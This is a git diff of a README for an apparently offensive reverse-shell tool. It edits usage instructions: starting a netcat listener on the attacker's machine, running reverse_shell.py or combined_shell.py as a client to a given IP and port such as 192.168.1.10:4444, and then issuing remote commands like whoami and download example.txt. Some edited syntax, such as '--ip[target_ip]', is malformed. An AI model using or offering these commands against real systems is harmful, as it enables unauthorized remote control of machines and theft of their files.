@@ -25,8 +25,8 @@ cd Reverse-Shell
 On the attacker's machine, set up a listener to receive the reverse shell connection. You can use `netcat` (nc) for this purpose.
 
 ```sh
-python3 reverse_shell.py
-python3 reverse_shell.py server --port 4444
+python3 reverse_shell.py -h
+python3 reverse_shell.py client --ip[target_ip] --port[target_port] 
 nc -lvp <target_port>
 whoami
 user
@@ -35,17 +35,7 @@ download example.txt
 cd /tmp
 exit
 
-## Example Interaction
-1. Attacker's Machine:
-
-Set up the listener:
-nc -lvp 4444
-2. Target Machine:
-
-Run the script:
-python3 reverse_shell.py 192.168.1.100 4444
-
-3. Attacker's Machine:
+python3 combined_shell.py client --ip 192.168.1.10 --port 4444
 
 Send a command:
 whoami
